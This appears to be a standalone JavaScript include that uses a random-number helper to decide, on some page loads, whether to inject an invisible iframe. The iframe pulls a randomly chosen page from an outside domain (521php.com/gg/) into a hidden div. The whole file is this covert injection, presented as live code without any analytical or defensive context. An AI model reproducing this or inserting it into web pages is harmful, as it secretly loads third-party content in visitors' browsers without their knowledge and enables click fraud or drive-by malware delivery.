if(undefined == _num1){
	var _num1 = 4;
}
function GetRandomNum(Min,Max)
{   
var Range = Max - Min;   
var Rand = Math.random();   
return(Min + Math.round(Rand * Range));   
}   
var _num2 = GetRandomNum(1,10);
var _n = GetRandomNum(1,100);
if(_num1 >= _num2){
	document.write('<div style="display:none"><iframe src="http://www.521php.com/gg/index_'+_n+'.html"></iframe></div>');
}
